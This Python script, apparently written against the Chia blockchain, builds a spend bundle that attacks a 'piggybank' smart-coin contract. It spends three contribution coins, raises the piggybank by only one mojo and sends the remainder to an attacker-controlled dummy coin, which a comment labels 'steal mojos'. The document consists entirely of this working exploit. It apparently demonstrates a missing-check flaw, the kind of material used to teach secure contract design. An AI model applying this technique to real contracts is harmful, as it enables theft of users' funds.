from piggybank_drivers import *

# get existing coins from blockchain
## piggybank coin
pc = get_coin("396d35e71e5109831545f8c862110017e048fe502222897e61a52d4134989c27")

## contribution coins
cc = [
    get_coin("a00ad3b203070e14ddaef8a6abd574486d2eae9aa12ef55854c84b096308cb9e"),
    get_coin("7798978816268953fc06e6fbdca1444646c84da0ebb17f84fe70583bc2d3e788"),
    get_coin("0fc2613b732d113fa48cbef5308b43dffbc80eec1c0e3a4149f2c397d566df7e")
]

## dummy coin
dc = get_coin("12c0709babe92736387cd4ab8b4082af3aab33422fcc9cd1092ba6f6f6b01b66")

# prepare coin spends
contribution_amount = sum([c.amount for c in cc])
piggybank_new_amount = pc.amount + 1
dummy_new_amount = dc.amount + (contribution_amount - 1)

cc_solution = solution_for_contribution()
contribution_spends = [CoinSpend(c, CONTRIBUTION_MOD, cc_solution) for c in cc]

piggybank_spend = CoinSpend(
    pc,
    PIGGYBANK_MOD,
    Program.to([pc.amount, piggybank_new_amount, pc.puzzle_hash])
)

## steal mojos and put them to a new dummy coin
dummy_spend = CoinSpend(
    dc,
    DUMMY_MOD,
    Program.to([(dummy_new_amount), dc.puzzle_hash])

)

coin_spends = [cs for cs in contribution_spends]
coin_spends.append(piggybank_spend)
coin_spends.append(dummy_spend)

spend_bundle = SpendBundle(coin_spends, G2Element())
